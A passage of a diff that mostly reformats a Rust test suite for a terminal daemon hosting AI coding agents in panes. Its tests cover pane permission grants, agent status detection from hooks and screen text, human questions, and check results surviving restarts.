     assert!(!d.command(5, ask).unwrap(), "the reply waits for you");
     assert_eq!(d.terms[&t].status, Status::Blocked, "it needs you");
     let q = d.snapshot().questions;
     assert_eq!((q.len(), q[0].text.as_str()), (1, "Deploy to staging?"));
     // You answer No: the asker gets it, the pane is back at work.
-    d.command(0, Command::AnswerHuman { id: q[0].id, choice: 1 }).unwrap();
+    d.command(
+        0,
+        Command::AnswerHuman {
+            id: q[0].id,
+            choice: 1,
+        },
+    )
+    .unwrap();
     assert!(matches!(asker.try_recv(), Ok(ServerMsg::Reply(Reply::Text(a))) if a == "No"));
     assert_eq!(d.terms[&t].status, Status::Working);
     assert!(d.snapshot().questions.is_empty());
@@ -1382,21 +2623,46 @@ fn a_pane_does_what_its_grants_allow() {
     d.handle(Ev::Connected(7, tx, false));
     let token = d.terms[&a].token.clone();
     d.handle(Ev::From(7, a, token));
-    let err = |out: &mut mpsc::Receiver<ServerMsg>| matches!(out.try_recv(), Ok(ServerMsg::Error(_)));
+    let err =
+        |out: &mut mpsc::Receiver<ServerMsg>| matches!(out.try_recv(), Ok(ServerMsg::Error(_)));
     // Reading another pane: allowed by default.
     d.message(7, ClientMsg::Query(Query::Read { term: b }));
-    assert!(matches!(out.try_recv(), Ok(ServerMsg::Reply(Reply::Text(_)))), "read is a default grant");
+    assert!(
+        matches!(out.try_recv(), Ok(ServerMsg::Reply(Reply::Text(_)))),
+        "read is a default grant"
+    );
     // Answering b's prompt: not without respond.
     d.terms.get_mut(&b).unwrap().status = Status::Blocked;
-    d.message(7, ClientMsg::Input { term: b, data: b"1".to_vec() });
+    d.message(
+        7,
+        ClientMsg::Input {
+            term: b,
+            data: b"1".to_vec(),
+        },
+    );
     assert!(err(&mut out), "respond isn't a default grant");
     // Closing b: not without admin; and it can't grant itself more.
     d.message(7, ClientMsg::Command(Command::ClosePane { term: b }));
-    assert!(err(&mut out) && d.terms.contains_key(&b), "admin isn't a default grant");
-    d.message(7, ClientMsg::Command(Command::Grant { term: a, grants: Some(vec!["admin".into()]) }));
+    assert!(
+        err(&mut out) && d.terms.contains_key(&b),
+        "admin isn't a default grant"
+    );
+    d.message(
+        7,
+        ClientMsg::Command(Command::Grant {
+            term: a,
+            grants: Some(vec!["admin".into()]),
+        }),
+    );
     assert!(err(&mut out), "grants are yours to give");
     // You give it admin: now it may.
-    d.message(0, ClientMsg::Command(Command::Grant { term: a, grants: Some(vec!["admin".into()]) }));
+    d.message(
+        0,
+        ClientMsg::Command(Command::Grant {
+            term: a,
+            grants: Some(vec!["admin".into()]),
+        }),
+    );
     d.message(7, ClientMsg::Command(Command::ClosePane { term: b }));
     assert!(!d.terms.contains_key(&b), "closed once allowed");
     let terms: Vec<TermId> = d.terms.keys().copied().collect();
@@ -1407,9 +2673,19 @@ fn a_pane_does_what_its_grants_allow() {
 fn a_popup_floats_in_no_workspace_and_goes_when_done() {
     let (mut d, mut rx) = daemon();
     let cmd = if cfg!(windows) { "cmd /c exit" } else { "true" };
-    d.command(0, Command::Popup { cmd: cmd.into(), cwd: Some(std::env::temp_dir()) }).unwrap();
+    d.command(
+        0,
+        Command::Popup {
+            cmd: cmd.into(),
+            cwd: Some(std::env::temp_dir()),
+        },
+    )
+    .unwrap();
     let (&id, t) = d.terms.iter().next().expect("the popup's pane");
-    assert!(t.popup && d.workspaces.is_empty(), "floating, in no workspace");
+    assert!(
+        t.popup && d.workspaces.is_empty(),
+        "floating, in no workspace"
+    );
     assert!(d.snapshot().terms[&id].popup);
     // Its command exits: the pane goes. (A ceiling, not a wait: on a machine with every core
     // busy, starting and ending even this takes a while.)
@@ -1429,22 +2705,68 @@ fn an_agent_stays_in_the_folder_it_started_in() {
     let (mut d, _rx) = daemon();
     let t = pane(&mut d);
     let secret = d.terms[&t].token.clone();
-    let base = std::env::temp_dir().join(format!(concat!(env!("APP_COMMAND"), "-pin-{}"), std::process::id()));
+    let base = std::env::temp_dir().join(format!(
+        concat!(env!("APP_COMMAND"), "-pin-{}"),
+        std::process::id()
+    ));
     let (home, other) = (base.join("home"), base.join("other"));
     std::fs::create_dir_all(&home).unwrap();
     std::fs::create_dir_all(&other).unwrap();
-    let at = |cwd: &std::path::Path, status: HookStatus, event: &str| match report(t, &secret, 0, status, event) {
-        ClientMsg::Hook { term, agent, status, session, prompt, said, subagent, event, pid, token, transcript, model, name, background, .. } => {
-            ClientMsg::Hook { term, agent, status, session, cwd: Some(cwd.to_path_buf()), prompt, said, subagent, event, pid, token, transcript, model, name, background }
-        }
+    let at = |cwd: &std::path::Path, status: HookStatus, event: &str| match report(
+        t, &secret, 0, status, event,
+    ) {
+        ClientMsg::Hook {
+            term,
+            agent,
+            status,
+            session,
+            prompt,
+            said,
+            subagent,
+            event,
+            pid,
+            token,
+            transcript,
+            model,
+            name,
+            background,
+            ..
+        } => ClientMsg::Hook {
+            term,
+            agent,
+            status,
+            session,
+            cwd: Some(cwd.to_path_buf()),
+            prompt,
+            said,
+            subagent,
+            event,
+            pid,
+            token,
+            transcript,
+            model,
+            name,
+            background,
+        },
         _ => unreachable!(),
     };
     // Its first report places it.
-    d.apply_hook(at(&home, HookStatus::Working, "UserPromptSubmit"), Some(true), Vec::new());
+    d.apply_hook(
+        at(&home, HookStatus::Working, "UserPromptSubmit"),
+        Some(true),
+        Vec::new(),
+    );
     assert_eq!(d.terms[&t].cwd, home);
     // Working in another folder doesn't move it.
-    d.apply_hook(at(&other, HookStatus::Working, "PreToolUse"), Some(true), Vec::new());
-    assert_eq!(d.terms[&t].cwd, home, "its row stays in the group it started in");
+    d.apply_hook(
+        at(&other, HookStatus::Working, "PreToolUse"),
+        Some(true),
+        Vec::new(),
+    );
+    assert_eq!(
+        d.terms[&t].cwd, home,
+        "its row stays in the group it started in"
+    );
     close(&mut d, &[t]);
     let _ = std::fs::remove_dir_all(&base);
 }
@@ -1457,7 +2779,8 @@ fn an_agent_read_from_its_screen_isnt_done_while_its_screen_still_moves() {
         // Codex with its notify pointed elsewhere: no hooks, only its screen.
         let p = d.terms.get_mut(&t).unwrap();
         (p.agent, p.hooked, p.status) = (Some("codex".into()), false, Status::Working);
-        p.parser.process(b"\xe2\x80\xa2 Working (3s \xe2\x80\xa2 esc to interrupt)\r\n");
+        p.parser
+            .process(b"\xe2\x80\xa2 Working (3s \xe2\x80\xa2 esc to interrupt)\r\n");
         // A long block printed under it pushes the working line out of the rows looked at.
         for i in 0..40 {
             p.parser.process(format!("+ added line {i}\r\n").as_bytes());
@@ -1465,7 +2788,11 @@ fn an_agent_read_from_its_screen_isnt_done_while_its_screen_still_moves() {
         p.last_output = Instant::now();
     }
     d.update_statuses();
-    assert_eq!(d.terms[&t].status, Status::Working, "still printing: not done, and no alert");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Working,
+        "still printing: not done, and no alert"
+    );
     // The screen goes still: now it's done.
     d.terms.get_mut(&t).unwrap().last_output = Instant::now() - Duration::from_secs(10);
     d.update_statuses();
@@ -1489,7 +2816,11 @@ fn codex_shows_working_from_its_screen_after_a_turn() {
         p.parser.process(b"\xe2\x80\xa2 Working (3s \xe2\x80\xa2 esc to interrupt)\r\n\r\n> Ask Codex to do anything");
     }
     d.update_statuses();
-    assert_eq!(d.terms[&t].status, Status::Working, "seen on its screen: its hooks never say a turn started");
+    assert_eq!(
+        d.terms[&t].status,
+        Status::Working,
+        "seen on its screen: its hooks never say a turn started"
+    );
     // Without anything typed since the turn ended, the old line on screen doesn't count.
     {
         let p = d.terms.get_mut(&t).unwrap();
@@ -1507,16 +2838,36 @@ fn repeated_status_observations_refresh_evidence_without_restarting_the_turn() {
     let (mut d, _rx) = daemon();
     let id = pane(&mut d);
     let t = d.terms.get_mut(&id).unwrap();
-    t.status = Status::Working; t.status_since = 7; t.status_why = "hook: working".into();
+    t.status = Status::Working;
+    t.status_since = 7;
+    t.status_why = "hook: working".into();
     t.last_screen = Some(("old observation".into(), 1));
     d.set_status(id, Status::Working, "screen: activity row is present");
     let t = &d.terms[&id];
-    let result = (t.status_since, t.status_why.clone(), t.last_screen.clone(), t.alert_due.is_none());
+    let result = (
+        t.status_since,
+        t.status_why.clone(),
+        t.last_screen.clone(),
+        t.alert_due.is_none(),
+    );
     close(&mut d, &[id]);
-    assert_eq!(result.0, 7, "evidence freshness is separate from turn duration");
-    assert_eq!(result.1, "hook: working", "the original status source stays authoritative");
-    assert!(result.2.is_some_and(|(detail, at)| detail == "activity row is present" && at > 1));
-    assert!(result.3, "the same status does not announce another transition");
+    assert_eq!(
+        result.0, 7,
+        "evidence freshness is separate from turn duration"
+    );
+    assert_eq!(
+        result.1, "hook: working",
+        "the original status source stays authoritative"
+    );
+    assert!(
+        result
+            .2
+            .is_some_and(|(detail, at)| detail == "activity row is present" && at > 1)
+    );
+    assert!(
+        result.3,
+        "the same status does not announce another transition"
+    );
 }
 
 #[test]
@@ -1526,13 +2877,19 @@ fn codex_detects_work_with_background_terminals_and_wrapped_footers() {
     let mut observed = Vec::new();
     for hooked in [false, true] {
         for cols in [160, 32] {
-            for suffix in ["", " · 1 background terminal running · /ps to view · /stop to close"] {
+            for suffix in [
+                "",
+                " · 1 background terminal running · /ps to view · /stop to close",
+            ] {
                 let t = d.terms.get_mut(&id).unwrap();
                 t.resize(cols, 24);
-                t.agent = Some("codex".into()); t.hooked = hooked; t.status = Status::Done;
+                t.agent = Some("codex".into());
+                t.hooked = hooked;
+                t.status = Status::Done;
                 t.status_since = term::unix_now() - 10;
                 t.last_input = Instant::now();
-                t.parser.process(b"\x1b[2J\x1b[H"); t.parser.process(&b"\r\n".repeat(30));
+                t.parser.process(b"\x1b[2J\x1b[H");
+                t.parser.process(&b"\r\n".repeat(30));
                 t.parser.process(format!("• Working (2m 40s • esc to interrupt){suffix}\r\n> Ask Codex to do anything").as_bytes());
                 d.update_statuses();
                 observed.push((hooked, cols, suffix, d.terms[&id].status));
@@ -1540,23 +2897,41 @@ fn codex_detects_work_with_background_terminals_and_wrapped_footers() {
         }
     }
     close(&mut d, &[id]);
-    assert!(observed.iter().all(|(_, _, _, status)| *status == Status::Working), "native Codex activity must survive metadata and soft wraps: {observed:?}");
+    assert!(
+        observed
+            .iter()
+            .all(|(_, _, _, status)| *status == Status::Working),
+        "native Codex activity must survive metadata and soft wraps: {observed:?}"
+    );
 }
 
 #[test]
 fn codex_can_start_its_next_turn_without_waiting_for_the_wall_clock() {
     let (mut d, _rx) = daemon();
     let id = pane(&mut d);
-    d.hook(id, "codex".into(), HookStatus::Done, "agent-turn-complete", &[]);
+    d.hook(
+        id,
+        "codex".into(),
+        HookStatus::Done,
+        "agent-turn-complete",
+        &[],
+    );
     let t = d.terms.get_mut(&id).unwrap();
     // A backwards clock makes the same zero-second interval as a prompt sent immediately.
     t.status_since = u64::MAX;
     t.last_input = Instant::now();
     t.parser.process(&b"\r\n".repeat(30));
-    t.parser.process("• Working (1s • esc to interrupt)\r\n> Ask Codex to do anything".as_bytes());
+    t.parser
+        .process("• Working (1s • esc to interrupt)\r\n> Ask Codex to do anything".as_bytes());
     d.update_statuses();
     let mut observed = vec![d.terms[&id].status];
-    d.hook(id, "codex".into(), HookStatus::Done, "agent-turn-complete", &[]);
+    d.hook(
+        id,
+        "codex".into(),
+        HookStatus::Done,
+        "agent-turn-complete",
+        &[],
+    );
     d.update_statuses();
     observed.push(d.terms[&id].status);
     d.set_status(id, Status::Idle, "you're looking at it");
@@ -1569,7 +2944,11 @@ fn codex_can_start_its_next_turn_without_waiting_for_the_wall_clock() {
     d.update_statuses();
     observed.push(d.terms[&id].status);
     close(&mut d, &[id]);
-    assert_eq!(observed, [Status::Working, Status::Done, Status::Idle, Status::Working], "new input starts work immediately or after a delay; a stale footer stays finished, even after being seen");
+    assert_eq!(
+        observed,
+        [Status::Working, Status::Done, Status::Idle, Status::Working],
+        "new input starts work immediately or after a delay; a stale footer stays finished, even after being seen"
+    );
 }
 
 #[test]
@@ -1579,33 +2958,65 @@ fn codex_live_footer_restarts_work_without_new_keyboard_input() {
     let t = d.terms.get_mut(&id).unwrap();
     t.agent = Some("codex".into());
     t.output(format!("\x1b[2J\x1b[H{}Working (3m 11s • esc to interrupt) · 3 background terminals running · /ps to view · /stop to close\r\n› Ask Codex to do anything", "\r\n".repeat(30)).as_bytes());
-    d.hook(id, "codex".into(), HookStatus::Done, "agent-turn-complete", &[]);
+    d.hook(
+        id,
+        "codex".into(),
+        HookStatus::Done,
+        "agent-turn-complete",
+        &[],
+    );
     d.update_statuses();
     let mut observed = vec![d.terms[&id].status];
     let t = d.terms.get_mut(&id).unwrap();
     t.output(format!("\x1b[2J\x1b[H{}Working (3m 12s • esc to interrupt) · 3 background terminals running · /ps to view · /stop to close\r\n› Ask Codex to do anything", "\r\n".repeat(30)).as_bytes());
-    d.update_statuses(); observed.push(d.terms[&id].status);
+    d.update_statuses();
+    observed.push(d.terms[&id].status);
     close(&mut d, &[id]);
-    assert_eq!(observed, [Status::Done, Status::Working], "an unchanged old footer stays finished; an advancing live footer is working even without new keys");
+    assert_eq!(
+        observed,
+        [Status::Done, Status::Working],
+        "an unchanged old footer stays finished; an advancing live footer is working even without new keys"
+    );
 }
 
 #[test]
 fn native_hooks_cannot_keep_an_exited_agent_working_or_hide_its_replacement() {
     let (mut d, _rx) = daemon();
     let id = pane(&mut d);
-    let found = |agent: Option<&str>| scan::Found { term: id, process: "powershell".into(), agent: agent.map(str::to_string), cwd: None, agent_cwd: None, mem: 0, cpu: 0.0, remote: None };
+    let found = |agent: Option<&str>| scan::Found {
+        term: id,
+        process: "powershell".into(),
+        agent: agent.map(str::to_string),
+        cwd: None,
+        agent_cwd: None,
+        mem: 0,
+        cpu: 0.0,
+        remote: None,
+    };
     d.hook(id, "pi".into(), HookStatus::Working, "pi.agent_start", &[]);
     d.handle(Ev::Scan(vec![found(None)]));
     let startup = d.terms[&id].status;
     d.handle(Ev::Scan(vec![found(Some("pi"))]));
     d.handle(Ev::Scan(vec![found(None)]));
-    let exited = (d.terms[&id].status, d.terms[&id].agent.clone(), d.terms[&id].hooked);
+    let exited = (
+        d.terms[&id].status,
+        d.terms[&id].agent.clone(),
+        d.terms[&id].hooked,
+    );
     d.hook(id, "codex".into(), HookStatus::Working, "native", &[]);
     d.terms.get_mut(&id).unwrap().last_hook_at = Some(Instant::now() - Duration::from_secs(4));
     d.handle(Ev::Scan(vec![found(Some("opencode"))]));
-    let replacement = (d.terms[&id].agent.clone(), d.terms[&id].hooked, d.terms[&id].status);
+    let replacement = (
+        d.terms[&id].agent.clone(),
+        d.terms[&id].hooked,
+        d.terms[&id].status,
+    );
     close(&mut d, &[id]);
-    assert_eq!(startup, Status::Working, "initial process scan can lag a native hook");
+    assert_eq!(
+        startup,
+        Status::Working,
+        "initial process scan can lag a native hook"
+    );
     assert_eq!(exited, (Status::None, None, false));
     assert_eq!(replacement, (Some("opencode".into()), false, Status::Idle));
 }
@@ -1617,23 +3028,38 @@ fn codex_status_ignores_activity_in_a_finished_answer() {
     let mut observed = Vec::new();
     for hooked in [false, true] {
         let t = d.terms.get_mut(&id).unwrap();
-        t.agent = Some("codex".into()); t.hooked = hooked;
-        t.status = if hooked { Status::Done } else { Status::Working };
+        t.agent = Some("codex".into());
+        t.hooked = hooked;
+        t.status = if hooked {
+            Status::Done
+        } else {
+            Status::Working
+        };
         t.status_since = term::unix_now() - 10;
-        t.last_input = Instant::now(); t.last_output = Instant::now() - Duration::from_secs(10);
-        t.parser.process(b"\x1b[2J\x1b[H"); t.parser.process(&b"\r\n".repeat(30));
+        t.last_input = Instant::now();
+        t.last_output = Instant::now() - Duration::from_secs(10);
+        t.parser.process(b"\x1b[2J\x1b[H");
+        t.parser.process(&b"\r\n".repeat(30));
         t.parser.process(b"I checked the live daemon: it matches Codex's esc to interrupt spinner.\r\nWorked for 50s\r\n> Ask Codex to do anything");
         d.update_statuses();
         observed.push(d.terms[&id].status);
         let t = d.terms.get_mut(&id).unwrap();
-        t.status_since = term::unix_now() - 10; t.last_input = Instant::now();
-        t.parser.process(b"\x1b[2J\x1b[H"); t.parser.process(&b"\r\n".repeat(30));
-        t.parser.process("• Working (8m 05s • esc to interrupt)\r\n> Ask Codex to do anything".as_bytes());
+        t.status_since = term::unix_now() - 10;
+        t.last_input = Instant::now();
+        t.parser.process(b"\x1b[2J\x1b[H");
+        t.parser.process(&b"\r\n".repeat(30));
+        t.parser.process(
+            "• Working (8m 05s • esc to interrupt)\r\n> Ask Codex to do anything".as_bytes(),
+        );
         d.update_statuses();
         observed.push(d.terms[&id].status);
     }
     close(&mut d, &[id]);
-    assert_eq!(observed, [Status::Done, Status::Working, Status::Done, Status::Working], "finished prose never starts or extends a turn, with or without hooks; the actual activity row does");
+    assert_eq!(
+        observed,
+        [Status::Done, Status::Working, Status::Done, Status::Working],
+        "finished prose never starts or extends a turn, with or without hooks; the actual activity row does"
+    );
 }
 
 #[test]
@@ -1643,24 +3069,41 @@ fn codex_queued_questions_need_attention_even_while_work_continues() {
     let mut observed = Vec::new();
     for hooked in [false, true] {
         let t = d.terms.get_mut(&id).unwrap();
-        t.agent = Some("codex".into()); t.hooked = hooked; t.status = Status::Working;
-        t.parser.process(b"\x1b[2J\x1b[H"); t.parser.process(&b"\r\n".repeat(30));
+        t.agent = Some("codex".into());
+        t.hooked = hooked;
+        t.status = Status::Working;
+        t.parser.process(b"\x1b[2J\x1b[H");
+        t.parser.process(&b"\r\n".repeat(30));
         t.parser.process(b"Working (8m 01s - esc to interrupt)\r\nQueued follow-up inputs\r\n  ? 1 question\r\n  shift+tab to answer\r\nAsk Codex to do anything");
         d.update_statuses();
         observed.push((hooked, d.terms[&id].status));
         let t = d.terms.get_mut(&id).unwrap();
-        t.parser.process(b"\x1b[2J\x1b[H"); t.parser.process(&b"\r\n".repeat(30));
-        t.parser.process(b"Working (8m 05s - esc to interrupt)\r\nAsk Codex to do anything");
+        t.parser.process(b"\x1b[2J\x1b[H");
+        t.parser.process(&b"\r\n".repeat(30));
+        t.parser
+            .process(b"Working (8m 05s - esc to interrupt)\r\nAsk Codex to do anything");
         d.update_statuses();
         observed.push((hooked, d.terms[&id].status));
     }
     let t = d.terms.get_mut(&id).unwrap();
-    t.parser.process(b"\x1b[2J\x1b[H"); t.parser.process(&b"\r\n".repeat(30));
-    t.parser.process(b"The report discusses 1 question\r\n? 0 questions\r\nWorking (esc to interrupt)");
+    t.parser.process(b"\x1b[2J\x1b[H");
+    t.parser.process(&b"\r\n".repeat(30));
+    t.parser
+        .process(b"The report discusses 1 question\r\n? 0 questions\r\nWorking (esc to interrupt)");
     d.update_statuses();
     observed.push((true, d.terms[&id].status));
     close(&mut d, &[id]);
-    assert_eq!(observed, [(false, Status::Blocked), (false, Status::Working), (true, Status::Blocked), (true, Status::Working), (true, Status::Working)], "questions take precedence with or without hooks, then ongoing work resumes; prose and zero questions do not block");
+    assert_eq!(
+        observed,
+        [
+            (false, Status::Blocked),
+            (false, Status::Working),
+            (true, Status::Blocked),
+            (true, Status::Working),
+            (true, Status::Working)
+        ],
+        "questions take precedence with or without hooks, then ongoing work resumes; prose and zero questions do not block"
+    );
 }
 
 #[test]
@@ -1670,9 +3113,16 @@ fn native_pi_and_opencode_questions_stay_blocked_until_their_reply_event() {
     let mut observed = Vec::new();
     for agent in ["pi", "opencode"] {
         d.hook(id, agent.into(), HookStatus::Working, "native start", &[]);
-        d.hook(id, agent.into(), HookStatus::Blocked, "native question", &[]);
+        d.hook(
+            id,
+            agent.into(),
+            HookStatus::Blocked,
+            "native question",
+            &[],
+        );
         let t = d.terms.get_mut(&id).unwrap();
-        t.parser.process(b"\x1b[2J\x1b[HCustom extension dialog\r\nPick a project");
+        t.parser
+            .process(b"\x1b[2J\x1b[HCustom extension dialog\r\nPick a project");
         t.blocked_at = Some(Instant::now() - Duration::from_secs(20));
         t.last_input = Instant::now() - Duration::from_secs(10);
         t.last_output = t.last_input;
@@ -1684,7 +3134,17 @@ fn native_pi_and_opencode_questions_stay_blocked_until_their_reply_event() {
         observed.push(d.terms[&id].status);
     }
     close(&mut d, &[id]);
-    assert_eq!(observed, [Status::Blocked, Status::Working, Status::Done, Status::Blocked, Status::Working, Status::Done]);
+    assert_eq!(
+        observed,
+        [
+            Status::Blocked,
+            Status::Working,
+            Status::Done,
+            Status::Blocked,
+            Status::Working,
+            Status::Done
+        ]
+    );
 }
 
 #[test]
@@ -1694,18 +3154,31 @@ fn codex_expanded_question_overrides_working_until_dismissed() {
     let mut observed = Vec::new();
     for hooked in [false, true] {
         let t = d.terms.get_mut(&id).unwrap();
-        t.agent = Some("codex".into()); t.hooked = hooked; t.status = Status::Working;
+        t.agent = Some("codex".into());
+        t.hooked = hooked;
+        t.status = Status::Working;
         t.parser.process(b"\x1b[2J\x1b[H");
         t.parser.process(&b"\r\n".repeat(30));
         t.parser.process("Working (8m 01s - esc to interrupt)\r\nChoose an app:\r\n> 1. Pi / OpenCode\r\nenter submit   ctrl+] skip   shift+↔ main prompt".as_bytes());
-        d.update_statuses(); observed.push(d.terms[&id].status);
+        d.update_statuses();
+        observed.push(d.terms[&id].status);
         let t = d.terms.get_mut(&id).unwrap();
-        t.parser.process(b"\x1b[2J\x1b[H"); t.parser.process(&b"\r\n".repeat(30));
+        t.parser.process(b"\x1b[2J\x1b[H");
+        t.parser.process(&b"\r\n".repeat(30));
         t.parser.process(b"Working (8m 02s - esc to interrupt)");
-        d.update_statuses(); observed.push(d.terms[&id].status);
+        d.update_statuses();
+        observed.push(d.terms[&id].status);
     }
     close(&mut d, &[id]);
-    assert_eq!(observed, [Status::Blocked, Status::Working, Status::Blocked, Status::Working]);
+    assert_eq!(
+        observed,
+        [
+            Status::Blocked,
+            Status::Working,
+            Status::Blocked,
+            Status::Working
+        ]
+    );
 }
 
 fn failed_check(output: &str) -> check::CheckRecord {
@@ -1725,13 +3198,37 @@ fn the_snapshot_carries_a_check_summary_and_a_query_returns_its_output() {
     let t = pane(&mut d);
     let (tx, mut out) = mpsc::channel(16);
     d.handle(Ev::Connected(7, tx, false));
-    d.message(7, ClientMsg::Query(Query::CheckOutput { term: t, name: None }));
-    assert!(matches!(out.try_recv(), Ok(ServerMsg::Error(_))), "no check, no output");
-    d.terms.get_mut(&t).unwrap().checks.points = vec![failed_check("ok a\nFAIL footer.test.ts\n").into()];
-    let info = d.snapshot().terms[&t].check().cloned().expect("the summary is in the snapshot");
-    assert_eq!((info.state, info.first_failing_line.as_str()), (CheckState::Failed, "FAIL footer.test.ts"));
-    d.message(7, ClientMsg::Query(Query::CheckOutput { term: t, name: None }));
-    assert!(matches!(out.try_recv(), Ok(ServerMsg::Reply(Reply::Text(text))) if text == "ok a\nFAIL footer.test.ts\n"));
+    d.message(
+        7,
+        ClientMsg::Query(Query::CheckOutput {
+            term: t,
+            name: None,
+        }),
+    );
+    assert!(
+        matches!(out.try_recv(), Ok(ServerMsg::Error(_))),
+        "no check, no output"
+    );
+    d.terms.get_mut(&t).unwrap().checks.points =
+        vec![failed_check("ok a\nFAIL footer.test.ts\n").into()];
+    let info = d.snapshot().terms[&t]
+        .check()
+        .cloned()
+        .expect("the summary is in the snapshot");
+    assert_eq!(
+        (info.state, info.first_failing_line.as_str()),
+        (CheckState::Failed, "FAIL footer.test.ts")
+    );
+    d.message(
+        7,
+        ClientMsg::Query(Query::CheckOutput {
+            term: t,
+            name: None,
+        }),
+    );
+    assert!(
+        matches!(out.try_recv(), Ok(ServerMsg::Reply(Reply::Text(text))) if text == "ok a\nFAIL footer.test.ts\n")
+    );
     close(&mut d, &[t]);
 }
 
@@ -1745,8 +3242,17 @@ fn a_pane_may_not_read_another_panes_check_output_without_the_read_grant() {
     let token = d.terms[&a].token.clone();
     d.handle(Ev::From(7, a, token));
     d.terms.get_mut(&a).unwrap().grants = Some(Vec::new());
-    d.message(7, ClientMsg::Query(Query::CheckOutput { term: b, name: None }));
-    assert!(matches!(out.try_recv(), Ok(ServerMsg::Error(_))), "read is a grant");
+    d.message(
+        7,
+        ClientMsg::Query(Query::CheckOutput {
+            term: b,
+            name: None,
+        }),
+    );
+    assert!(
+        matches!(out.try_recv(), Ok(ServerMsg::Error(_))),
+        "read is a grant"
+    );
     close(&mut d, &[a, b]);
 }
 
@@ -1757,11 +3263,29 @@ fn check_results_survive_a_restart_with_their_output() {
     let tails = persist::scratch_dir();
     d.check_dir = tails.path().to_path_buf();
     let old: TermId = 9_201;
-    let overridden = CheckInfo { state: CheckState::Overridden, overridden_at: Some(5), override_reason: "flaky".into(), ..failed_check("").info };
+    let overridden = CheckInfo {
+        state: CheckState::Overridden,
+        overridden_at: Some(5),
+        override_reason: "flaky".into(),
+        ..failed_check("").info
+    };
     let unsaved = persist::save_check_outputs(
         tails.path(),
         persist::save_ticket(),
-        &[persist::CheckTail { term: old, name: String::new(), slot: persist::CheckSlot::Latest, text: "latest tail".into() }, persist::CheckTail { term: old, name: String::new(), slot: persist::CheckSlot::Overridden, text: "overridden tail".into() }],
+        &[
+            persist::CheckTail {
+                term: old,
+                name: String::new(),
+                slot: persist::CheckSlot::Latest,
+                text: "latest tail".into(),
+            },
+            persist::CheckTail {
+                term: old,
+                name: String::new(),
+                slot: persist::CheckSlot::Overridden,
+                text: "overridden tail".into(),
+            },
+        ],
         &[old],
     );
     assert!(unsaved.is_empty());
@@ -1772,22 +3296,74 @@ fn check_results_survive_a_restart_with_their_output() {
         check_trees: [(String::new(), "4b825dc".to_string())].into(),
         ..Default::default()
     };
-    let tab = persist::SavedTab { name: String::new(), layout: Node::Leaf(old), focus: old, panes: [(old, pane)].into() };
-    let ws = persist::SavedWs { name: String::new(), cwd: dir, worktree: false, color: None, group: None, tabs: vec![tab], active_tab: 0 };
-    d.restore(persist::Saved { workspaces: vec![ws], active: 0, made_worktrees: Vec::new() });
+    let tab = persist::SavedTab {
+        name: String::new(),
+        layout: Node::Leaf(old),
+        focus: old,
+        panes: [(old, pane)].into(),
+    };
+    let ws = persist::SavedWs {
+        name: String::new(),
+        cwd: dir,
+        worktree: false,
+        color: None,
+        group: None,
+        tabs: vec![tab],
+        active_tab: 0,
+    };
+    d.restore(persist::Saved {
+        workspaces: vec![ws],
+        active: 0,
+        made_worktrees: Vec::new(),
+        conversations: Vec::new(),
+        pending_starts: Vec::new(),
+        conversation_operations: Vec::new(),
+    });
     let t = d.workspaces[0].tabs[0].focus;
     let restored = &d.terms[&t];
-    assert_eq!(restored.checks.headline().map(|c| c.output.as_str()), Some("latest tail"));
-    assert_eq!(restored.checks.points.first().and_then(|p| p.overridden.as_ref()).map(|c| (&c.info, c.output.as_str())), Some((&overridden, "overridden tail")));
+    assert_eq!(
+        restored.checks.headline().map(|c| c.output.as_str()),
+        Some("latest tail")
+    );
+    assert_eq!(
+        restored
+            .checks
+            .points
+            .first()
+            .and_then(|p| p.overridden.as_ref())
+            .map(|c| (&c.info, c.output.as_str())),
+        Some((&overridden, "overridden tail"))
+    );
     let saved = d.saved();
     let again = &saved.workspaces[0].tabs[0].panes[&t];
-    assert_eq!((again.checks.iter().map(|c| c.state).collect::<Vec<_>>(), &again.checks_overridden), (vec![CheckState::Failed], &vec![overridden.clone()]));
-    assert_eq!(again.check_trees.get(""), Some(&"4b825dc".to_string()), "the tree its run saw is saved again");
+    assert_eq!(
+        (
+            again.checks.iter().map(|c| c.state).collect::<Vec<_>>(),
+            &again.checks_overridden
+        ),
+        (vec![CheckState::Failed], &vec![overridden.clone()])
+    );
+    assert_eq!(
+        again.check_trees.get(""),
+        Some(&"4b825dc".to_string()),
+        "the tree its run saw is saved again"
+    );
     let mut written = d.take_dirty_check_outputs();
     written.sort_by_key(|w| w.slot as u8);
-    let tail = |slot, text: &str| persist::CheckTail { term: t, name: String::new(), slot, text: text.into() };
-    let expected = [tail(persist::CheckSlot::Latest, "latest tail"), tail(persist::CheckSlot::Overridden, "overridden tail")];
-    assert_eq!(written, expected, "its output is written again under the new id");
+    let tail = |slot, text: &str| persist::CheckTail {
+        term: t,
+        name: String::new(),
+        slot,
+        text: text.into(),
+    };
+    let expected = [
+        tail(persist::CheckSlot::Latest, "latest tail"),
+        tail(persist::CheckSlot::Overridden, "overridden tail"),
+    ];
+    assert_eq!(
+        written, expected,
+        "its output is written again under the new id"
+    );
     assert!(d.take_dirty_check_outputs().is_empty(), "and only once");
     close(&mut d, &[t]);
 }
@@ -1796,10 +3372,22 @@ fn check_results_survive_a_restart_with_their_output() {
 fn a_check_that_was_running_when_the_server_stopped_reads_as_not_run() {
     let (mut d, _rx) = daemon();
     let t = pane(&mut d);
-    let running = CheckInfo { state: CheckState::Checking, ..Default::default() };
-    let saved = persist::SavedPane { checks: vec![running], ..Default::default() };
-    d.terms.get_mut(&t).unwrap().restore_checks(&d.check_dir.clone(), 9_202, &saved);
-    assert_eq!(d.terms[&t].checks.headline().map(|c| c.info.state), Some(CheckState::CouldNotRun));
+    let running = CheckInfo {
+        state: CheckState::Checking,
+        ..Default::default()
+    };
+    let saved = persist::SavedPane {
+        checks: vec![running],
+        ..Default::default()
+    };
+    d.terms
+        .get_mut(&t)
+        .unwrap()
+        .restore_checks(&d.check_dir.clone(), 9_202, &saved);
+    assert_eq!(
+        d.terms[&t].checks.headline().map(|c| c.info.state),
+        Some(CheckState::CouldNotRun)
+    );
     close(&mut d, &[t]);
 }
 
@@ -1812,7 +3400,12 @@ const LONG_CHECK_S: u64 = 600;
 /// An agent session in the temp folder (not a repo, so the folder is its project), whose
 /// project has a check running `command`.
 fn checked_agent(d: &mut Daemon, command: &str, timeout_s: u64) -> TermId {
-    d.cfg.check = vec![crate::config::CheckDef { project: std::env::temp_dir(), name: None, command: command.into(), timeout_s }];
+    d.cfg.check = vec![crate::config::CheckDef {
+        project: std::env::temp_dir(),
+        name: None,
+        command: command.into(),
